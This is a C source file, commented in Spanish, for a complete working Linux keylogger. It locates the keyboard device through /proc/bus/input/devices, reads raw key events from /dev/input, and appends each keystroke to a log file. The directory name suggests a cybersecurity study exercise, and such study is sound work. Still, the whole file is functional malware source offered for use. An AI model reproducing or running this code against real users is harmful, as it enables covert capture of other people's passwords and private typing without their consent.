#include <stdio.h> //Para operaciones de entrada y salida.
#include <fcntl.h> //Para manipulación de archivos y descriptores de archivos.
#include <unistd.h> //Provee acceso a la API del sistema POSIX, incluyendo operaciones con archivos.
#include <linux/input.h> //Define estructuras y constantes relacionadas con eventos de entrada en Linux.
#include <sys/stat.h> //Define la estructura de datos utilizada para obtener información sobre archivos.
#include <string.h> //Para funciones de manipulación de cadenas.
#include <stdlib.h> //Para funciones de utilidad general, como conversión de cadenas y gestión de memoria.
#include <errno.h> //Provee el mecanismo de manejo de errores.

#define LOGFILEPATH "/home/carlos30/Escritorio/Ciberseguridad/keylogger.txt"
//Aqui se define la ruta donde se almacenarán las teclas registradas.

char *getEvent();
char mapKey(int code);
//Declaramos las dos funciones auxiliares que utilizaremos

int main(){
    struct input_event ev; //Estructura que almacena información sobre eventos de entrada.
    static char path_keyboard[20] = "/dev/input/"; //Ruta al dispositivo de entrada de teclado.Se construye concatenando "/dev/input/" con el nombre del archivo de evento obtenido por getEvent().
    strcat(path_keyboard, getEvent()); //Agrega el nombre del archivo de evento a la ruta base "/dev/input/".
    path_keyboard[strlen(path_keyboard)-1] = 0; //Elimina un posible salto de línea al final de la cadena.

    int device_keyboard = open(path_keyboard, O_RDONLY); //Abre el dispositivo de teclado en modo de solo lectura.
    if (device_keyboard < 0) {
        perror("Error opening device");
        return 1;
    }

    FILE *fp = fopen(LOGFILEPATH, "a"); //Abre el archivo de registro en modo de "apéndice". Si no se puede abrir el archivo, se cierra el dispositivo de teclado y el programa termina.
    if (!fp) {
        perror("Error opening log file");
        close(device_keyboard);
        return 1;
    }

    while (1) {
        read(device_keyboard, &ev, sizeof(ev)); // Lee un evento del teclado.
        if (ev.type == EV_KEY && ev.value == 0) { //Filtra los eventos de tipo EV_KEY que indican que una tecla fue presionada y luego soltada.
            char key = mapKey(ev.code); //Convierte el código de la tecla en un carácter.
            if (key) {
                fputc(key, fp); //Escribe el carácter en el archivo de registro.
                fflush(fp);  //Asegura que los datos se escriban inmediatamente en el archivo.
            }
        }
    }

    fclose(fp);
    close(device_keyboard);
    return 0; //Se cierran el archivo de registro y el dispositivo de teclado antes de que el programa termine.
}

char *getEvent(){
    static char event[8];
    FILE *pipe = popen("cat /proc/bus/input/devices | grep -C 5 keyboard | grep -E -o 'event[0-9]'", "r");
    if (!pipe)
        exit(1); //Ejecuta un comando en la terminal y abre una tubería para leer su salida.

    fgets(event, 8, pipe); //Lee el nombre del archivo de evento del teclado.
    pclose(pipe); //Cierra la tubería.
    return event;
}

char mapKey(int code) {
    switch (code) {
        case KEY_A: return 'a';
        case KEY_B: return 'b';
        case KEY_C: return 'c';
        case KEY_D: return 'd';
        case KEY_E: return 'e';
        case KEY_F: return 'f';
        case KEY_G: return 'g';
        case KEY_H: return 'h';
        case KEY_I: return 'i';
        case KEY_J: return 'j';
        case KEY_K: return 'k';
        case KEY_L: return 'l';
        case KEY_M: return 'm';
        case KEY_N: return 'n';
        case KEY_O: return 'o';
        case KEY_P: return 'p';
        case KEY_Q: return 'q';
        case KEY_R: return 'r';
        case KEY_S: return 's';
        case KEY_T: return 't';
        case KEY_U: return 'u';
        case KEY_V: return 'v';
        case KEY_W: return 'w';
        case KEY_X: return 'x';
        case KEY_Y: return 'y';
        case KEY_Z: return 'z';
        case KEY_1: return '1';
        case KEY_2: return '2';
        case KEY_3: return '3';
        case KEY_4: return '4';
        case KEY_5: return '5';
        case KEY_6: return '6';
        case KEY_7: return '7';
        case KEY_8: return '8';
        case KEY_9: return '9';
        case KEY_0: return '0';
        case KEY_SPACE: return ' ';
        case KEY_ENTER: return '\n';
        case KEY_BACKSPACE: return '\b';
        default: return 0;
    }
}
